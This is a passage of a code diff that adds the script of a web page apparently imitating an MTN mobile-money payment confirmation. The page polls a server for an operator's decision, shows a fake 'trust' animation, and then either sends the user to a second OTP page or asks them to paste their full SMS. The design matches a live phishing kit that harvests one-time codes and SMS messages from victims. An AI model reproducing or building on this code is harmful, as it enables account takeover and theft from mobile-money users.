+      btn.disabled = false;
+      showToast(T.networkError);
+      return;
+    }
+
+    if (!serverAccepted) {
+      btn.disabled = false;
+      showToast(T.notAccepted);
+      return;
+    }
+
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authorizingOverlay').classList.add('show');
+    startTrustSlider();
+
+    pollingActive = true;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/mtn/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        stopTrustSlider();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          lang: currentLang
+        });
+        window.location.href = 'otp2.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'inactive') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          reason: 'inactive',
+          lang: currentLang
+        });
+        window.location.href = 'oops.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+        showNotice('noticeExpired');
+        document.getElementById('resendBtn').classList.add('sent');
+        document.getElementById('resendLabel').textContent = T.resendNow;
+        showToast(T.declinedToast);
+        return;
+      }
+
+      if (decision === 'needs_full_sms' || decision === 'fully') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+        showNotice('noticeFullSms');
+        document.getElementById('smsInput').focus();
+        showToast(T.fullSmsToast);
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     INIT
+  ═══════════════════════════════════════════════════════════ */
+  document.addEventListener('DOMContentLoaded', () => {
+    applyTranslations();
+    document.getElementById('amountValue').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('supportNum').textContent =
+      SUPPORT_NUMBERS[tx.c] || '—';
+  });
+</script>
+</body>
+</html>
